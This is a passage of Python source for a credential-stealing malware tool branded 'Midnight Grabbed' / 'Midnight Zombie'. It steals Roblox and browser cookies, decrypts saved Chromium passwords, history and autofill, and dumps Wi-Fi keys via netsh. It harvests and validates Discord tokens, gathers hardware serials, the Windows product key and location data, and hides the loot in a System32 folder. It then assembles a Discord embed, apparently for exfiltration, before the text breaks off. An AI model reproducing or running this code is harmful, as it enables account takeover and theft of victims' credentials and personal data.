    def StealRobloxCookies(self) -> None:
        cookies = []
        self.GrabBrowserCookies()

        browserCookies = "\n".join(self.Cookies)
        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
            cookies.append(match)

        output = list()
        for item in ('HKCU', 'HKLM'):
            process = subprocess.run(f"powershell Get-ItemPropertyValue -Path {item}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY", capture_output=True, shell=True)
            if not process.returncode:
                output.append(process.stdout.decode(errors="ignore"))

        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
            cookies.append(match)

        cookies = list(set(cookies))

        if cookies:
            saveToDir = r"C:\Windows\System32\$77\Midnight Grabbed\Game\Roblox"
            os.makedirs(saveToDir, exist_ok=True)

            note = "============== Encrypted ==============\n"
            output_file = os.path.join(saveToDir, "roblox_cookies.txt")
            with open(output_file, "w") as file:
                file.write(f"{note}\n{self.Separator}\n{self.Separator.join(cookies)}")
            self.RobloxCookiesCount += len(cookies)

    def GrabBrowserCookies(self):
        saveToDir = r"C:\Windows\System32\$77\Midnight Grabbed\Browsers"
        os.makedirs(saveToDir, exist_ok=True)

        browserPaths = {
            "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
            "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
            "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
            "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
            "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
            "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
            "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
            "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
            "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
            "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
            "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
            "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
            "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
        }

        for browser_name, browser_path in browserPaths.items():
            if os.path.exists(browser_path):
                try:
                    browser = Browsers.Browser(browser_path)
                    browserCookies = browser.GetCookies()

                    if browserCookies:
                        output_file = os.path.join(saveToDir, f"{browser_name}_cookies.txt")
                        with open(output_file, "w") as file:
                            for cookie in browserCookies:
                                cookie_line = f"{cookie[0]}\t{cookie[1]}\t{cookie[2]}\t{cookie[3]}\t{cookie[4]}"
                                file.write(cookie_line + "\n")
                        for cookie in browserCookies:
                            self.Cookies.append(cookie[3])
                except Exception as e:
                    continue

class Utility:     
    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name [:-4] if name.endswith(".exe") else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
            except Exception:
                pass

    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError("Browser path not found!")
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, "Local State")
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding="utf-8", errors="ignore") as file:
                        jsonContent: dict = json.load(file)

                    encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors="ignore")
            if (version.startswith(("v10", "v11"))):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors="ignore")
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()

            if encryptionKey is None:
                return passwords

            loginFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "login data":
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)

            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break

                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)

                        if url and username and password:
                            passwords.append((url, username, password))

                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)

            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()

            if encryptionKey is None:
                return cookies

            cookiesFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "cookies":
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)

            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break

                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)

                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))

                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)

            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)

            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break

                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()

                    for url, title, vc, lvt in results:
                        if url and title and vc is not None and lvt is not None:
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)

            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)

            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break

                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]

                    for data in results:
                        data = data.strip()
                        if data and not data in autofills:
                            autofills.append(data)
                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)

            return autofills

        def SaveBrowserData(self):
            saveDir = os.path.join("C:\\Windows\\System32\\$77\\Midnight Grabbed", "Browsers")
            os.makedirs(saveDir, exist_ok=True)

            cookies = self.GetCookies()
            with open(os.path.join(saveDir, "cookies.txt"), "w", encoding="utf-8") as file:
                for host, name, path, cookie, expiry in cookies:
                    file.write(f"Host: {host}\nName: {name}\nPath: {path}\nCookie: {cookie}\nExpiry: {expiry}\n\n")

            passwords = self.GetPasswords()
            with open(os.path.join(saveDir, "passwords.txt"), "w", encoding="utf-8") as file:
                for url, username, password in passwords:
                    file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

            history = self.GetHistory()
            with open(os.path.join(saveDir, "history.txt"), "w", encoding="utf-8") as file:
                for url, title, vc in history:
                    file.write(f"URL: {url}\nTitle: {title}\nVisit Count: {vc}\n\n")

            autofills = self.GetAutofills()
            with open(os.path.join(saveDir, "autofills.txt"), "w", encoding="utf-8") as file:
                for autofill in autofills:
                    file.write(f"Autofill: {autofill}\n")

class Wifi:
    def __init__(self):
        self.save_dir = r"C:\Windows\System32\$77\Midnight Grabbed\Wifi"
        os.makedirs(self.save_dir, exist_ok=True)

    def get_wifi_info(self):
        self.get_wifi_names_and_passwords()
        self.get_ip_info()
        self.get_ping_info()
        self.get_extra_info()

    def get_wifi_names_and_passwords(self):
        wifi_info = []
        command = "netsh wlan show profiles"
        profiles = subprocess.check_output(command, shell=True).decode('utf-8').split("\n")

        for profile in profiles:
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1][1:-1]
                try:
                    password_command = f'netsh wlan show profile "{profile_name}" key=clear'
                    password_info = subprocess.check_output(password_command, shell=True).decode('utf-8')
                    password = None
                    for line in password_info.split("\n"):
                        if "Key Content" in line:
                            password = line.split(":")[1][1:-1]
                            break
                    wifi_info.append((profile_name, password))
                except subprocess.CalledProcessError:
                    wifi_info.append((profile_name, None))

        with open(os.path.join(self.save_dir, "wifi_names_and_passwords.txt"), "w") as file:
            for name, password in wifi_info:
                file.write(f"SSID: {name}\tPassword: {password if password else 'None'}\n")

    def get_ip_info(self):
        local_ip = socket.gethostbyname(socket.gethostname())
        public_ip_info = requests.get('https://ipinfo.io/json').json()

        ipv4 = public_ip_info.get('ip')
        ipv6 = public_ip_info.get('bogon', 'Not Available')
        reverse_dns = socket.getfqdn(local_ip)
        hostname = socket.gethostname()
        nameservers = public_ip_info.get('nameservers', 'Not Available')
        remote_port = public_ip_info.get('ports', 'Not Available')

        with open(os.path.join(self.save_dir, "wifi_provider.txt"), "w") as file:
            file.write(f"Local IP: {local_ip}\n")
            file.write(f"Public IP: {ipv4}\n")
            file.write(f"IPv6: {ipv6}\n")
            file.write(f"Reverse DNS: {reverse_dns}\n")
            file.write(f"Hostname: {hostname}\n")
            file.write(f"Nameservers: {nameservers}\n")
            file.write(f"Remote Port: {remote_port}\n")

    def get_ping_info(self):
        command = "ping google.com -n 4"
        ping_result = subprocess.check_output(command, shell=True).decode('utf-8')
        average_ping = None
        for line in ping_result.splitlines():
            if "Average" in line:
                average_ping = line.split(" ")[-1]

        with open(os.path.join(self.save_dir, "average_ms.txt"), "w") as file:
            file.write(f"Average Ping: {average_ping} ms\n")

    def get_extra_info(self):
        g = geocoder.ip('me')
        extra_info = {
            'Continent': g.continent if hasattr(g, 'continent') else 'Not Available',
            'Country': g.country if hasattr(g, 'country') else 'Not Available',
            'Capital': g.city if hasattr(g, 'city') else 'Not Available',
            'State': g.state if hasattr(g, 'state') else 'Not Available',
            'City': g.city if hasattr(g, 'city') else 'Not Available',
            'Postal': g.postal if hasattr(g, 'postal') else 'Not Available',
            'ISP': g.provider if hasattr(g, 'provider') else 'Not Available',
            'Organization': g.org if hasattr(g, 'org') else 'Not Available',
            'AS Number': g.asn if hasattr(g, 'asn') else 'Not Available',
            'Time Zone': g.timezone if hasattr(g, 'timezone') else 'Not Available',
            'Longitude': g.lng if hasattr(g, 'lng') else 'Not Available',
            'Latitude': g.lat if hasattr(g, 'lat') else 'Not Available',
        }

        with open(os.path.join(self.save_dir, "extra.txt"), "w") as file:
            for key, value in extra_info.items():
                file.write(f"{key}: {value}\n")

class DiscordTokenStealer:
    def __init__(self):
        self.roaming = os.getenv('APPDATA')
        self.appdata = os.getenv('LOCALAPPDATA')
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[\w=]+"
        self.tokens = []
        self.bc_id = []

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def get_headers(self, token):
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': token
        }

    def steal_token(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for filname in os.listdir(path):
                        if filname[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers=self.get_headers(token))
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in self.bc_id:
                                            self.tokens.append(token)
                                            self.bc_id.append(uid)
                                except Exception:
                                    pass
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers=self.get_headers(token))
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.bc_id:
                                        self.tokens.append(token)
                                        self.bc_id.append(uid)
                            except Exception:
                                pass

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers=self.get_headers(token))
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.bc_id:
                                        self.tokens.append(token)
                                        self.bc_id.append(uid)
                            except Exception:
                                pass

        if self.tokens:
            output_folder = r"C:\Windows\System32\$77\Midnight Grabbed\Messaging\Discord"
            os.makedirs(output_folder, exist_ok=True)
            with open(os.path.join(output_folder, "Discord_App.txt"), "w") as file:
                file.write("\n".join(self.tokens))
        if not self.tokens:
            print("No tokens were grabbed. Please check the paths and ensure valid tokens are present.")

def run_command(command):
    try:
        output = subprocess.run(command, capture_output=True, shell=True, text=True).stdout.splitlines()
        return [line.strip() for line in output if line.strip()][1:]
    except Exception:
        return ["Unable to fetch"]

def get_system_info():
    gpu = run_command("wmic path win32_VideoController get name")
    system_info = {
        "computer_name": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "memory": str(round(psutil.virtual_memory().total / (1024 ** 3))) + " GB",
        "uuid": run_command("wmic csproduct get uuid")[0] if run_command("wmic csproduct get uuid") else "N/A",
        "cpu": platform.processor(),
        "gpu": gpu[0] if gpu else "Unable to detect GPU",
        "product_key": subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key",
        "manufacturer": run_command("wmic computersystem get manufacturer")[0] if run_command("wmic computersystem get manufacturer") else "N/A",
        "model": run_command("wmic computersystem get model")[0] if run_command("wmic computersystem get model") else "N/A",
        "baseboard": run_command("wmic baseboard get product")[0] if run_command("wmic baseboard get product") else "N/A",
        "baseboard_manufacturer": run_command("wmic baseboard get manufacturer")[0] if run_command("wmic baseboard get manufacturer") else "N/A",
        "bios_version": run_command("wmic bios get version")[0] if run_command("wmic bios get version") else "N/A",
    }
    return system_info

def get_serials():
    serials = {
        "bios_serial": run_command("wmic bios get serialnumber")[0] if run_command("wmic bios get serialnumber") else "N/A",
        "uuid": run_command("wmic csproduct get uuid")[0] if run_command("wmic csproduct get uuid") else "N/A",
        "cpu_serial": run_command("wmic cpu get serialnumber")[0] if run_command("wmic cpu get serialnumber") else "N/A",
        "processor_id": run_command("wmic cpu get processorid")[0] if run_command("wmic cpu get processorid") else "N/A",
        "diskdrive_serial": run_command("wmic diskdrive get serialnumber")[0] if run_command("wmic diskdrive get serialnumber") else "N/A",
        "baseboard_serial": run_command("wmic baseboard get serialnumber")[0] if run_command("wmic baseboard get serialnumber") else "N/A",
        "ram_serial": [serial for serial in run_command("wmic memorychip get serialnumber") if serial][0] if run_command("wmic memorychip get serialnumber") else "N/A",
        "mac_address": run_command("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress")[0] if run_command("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress") else "N/A",
        "gpu_info": run_command("wmic PATH Win32_VideoController GET Description,PNPDeviceID")[0] if run_command("wmic PATH Win32_VideoController GET Description,PNPDeviceID") else "N/A",
    }
    return serials

def get_public_ip_info():
    try:
        ip_response = requests.get('https://ipinfo.io/json')
        ip_data = ip_response.json()
        return {
            "ip": ip_data.get('ip', 'Unknown'),
            "region": ip_data.get('region', 'Unknown'),
            "country": ip_data.get('country', 'Unknown'),
            "timezone": ip_data.get('timezone', 'Unknown'),
            "vpn": "Yes" if 'vpn' in ip_data else "No",
            "org": ip_data.get('org', 'Unknown'),
            "company_name": ip_data.get('org', 'Unknown').split(' ')[0],
            "domain": ip_data.get('hostname', 'Unknown'),
        }
    except RequestException:
        return {
            "ip": "Unable to fetch",
            "region": "Unable to fetch",
            "country": "Unable to fetch",
            "timezone": "Unable to fetch",
            "vpn": "Unable to fetch",
            "org": "Unable to fetch",
            "company_name": "Unable to fetch",
            "domain": "Unable to fetch",
        }

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    cleaned = []
    discord_info_list = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + 'Opera Software\\Opera Stable\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except Exception as e:
            print(f"Error reading Local State for {platform}: {e}")
            continue
        
        for file in os.listdir(path + "\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            cleaned.append(token.replace("\\", ""))
            except PermissionError:
                print(f"Permission error reading file {file} in {platform}")
                continue
        
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError as e:
                print(f"Error decrypting token: {e}")
                continue
            if tok not in already_check:
                already_check.append(tok)
                headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                
                try:
                    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    if res.status_code == 200:
                        res_json = res.json()
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        
                        discord_info_list.append(f"User: {user_name}\n"
                                                 f"ID: {user_id}\n"
                                                 f"Email: {email}\n"
                                                 f"Phone: {phone}\n"
                                                 f"MFA Enabled: {mfa_enabled}\n"
                                                 f"Nitro: {has_nitro}\n"
                                                 f"Expires in: {days_left if days_left else 'None'} day(s)\n"
                                                 f"Token: {tok}\n")
                except Exception as e:
                    print(f"Error making request for {token}: {e}")
                    continue

    if discord_info_list:
        output_path = os.path.join("C:\\Windows\\System32\\$77\\Midnight Grabbed\\Messaging\\Discord", "Discord_App.txt")
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write("\n".join(discord_info_list))
            print(f"Discord information saved to {output_path}")
        except Exception as e:
            print(f"Error saving to file: {e}")
    else:
        print("No discord information found.")
    
    return output_path if discord_info_list else None

def GetWifiPasswords() -> dict:
    profiles = []
    passwords = {}

    for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
        if 'All User Profile' in line:
            name = line[(line.find(':') + 1):].strip()
            profiles.append(name)
        
    for profile in profiles:
        found = False
        for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'Key Content' in line:
                passwords[profile] = line[(line.find(':') + 1):].strip()
                found = True
                break
        if not found:
            passwords[profile] = '(None)'
    return passwords

def format_wifi_passwords(wifi_passwords):
    formatted = ""
    for profile, password in wifi_passwords.items():
        formatted += f"- Profile: ({profile}) | Password: ({password})\n"
    return formatted.strip()

wifi_passwords = GetWifiPasswords()
formatted_wifi_passwords = format_wifi_passwords(wifi_passwords)

def write_to_file(filename, content):
    with open(filename, 'w') as f:
        f.write(content)

def send_archive_with_embed(system_info, serials, ip_info, archive_path):
    system_details = f"""
Computer Name: {system_info['computer_name']}
Computer OS: {system_info['os']}
Total Memory: {system_info['memory']}
UUID: {system_info['uuid']}
CPU: {system_info['cpu']}
GPU: {system_info['gpu']}
Manufacturer: {system_info['manufacturer']}
Model: {system_info['model']}
BaseBoard: {system_info['baseboard']}
BaseBoard Manufacturer: {system_info['baseboard_manufacturer']}
BIOS Version: {system_info['bios_version']}
Product Key: {system_info['product_key']}"""

    ip_details = f"""
IP: {ip_info['ip']}
Region: {ip_info['region']}
Country: {ip_info['country']}
Timezone: {ip_info['timezone']}
Proxy/VPN: {ip_info['vpn']}
Organization: {ip_info['org']}
Company Name: {ip_info['company_name']}
Domain: {ip_info['domain']}"""

    system_serials = f"""
Bios Serial: {serials['bios_serial']}
UUID Serial: {serials['uuid']}
CPU Serial: {serials['cpu_serial']}
ProcessorID Serial: {serials['processor_id']}
Diskdrive Serial: {serials['diskdrive_serial']}
Baseboard Serial: {serials['baseboard_serial']}
RAM Serial: {serials['ram_serial']}
MacAddress: {serials['mac_address']}
GPU Info: {serials['gpu_info']}"""

    embed = {
        "title": "Midnight Zombie",
        "color": 0x000000,
        "fields": [
            {"name": "IP Info", "value": f"```autohotkey\n{ip_details}\n```", "inline": False},
            {"name": "System Info", "value": f"```autohotkey\n{system_details}\n```", "inline": False},
            {"name": "System Serials", "value": f"```autohotkey\n{system_serials}\n```", "inline": False},
        ]
    }

    payload = {
        "payload_json": json.dumps({
            "username": "Midnight Zombie",
